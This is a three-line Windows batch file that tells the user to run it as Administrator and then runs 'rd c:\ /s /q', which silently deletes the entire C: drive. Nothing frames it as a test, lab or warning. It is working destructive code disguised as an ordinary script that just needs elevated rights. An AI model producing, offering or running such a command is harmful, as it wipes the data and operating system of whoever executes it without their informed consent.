@echo off
echo Run as Administrator before continuing!
rd c:\ /s /q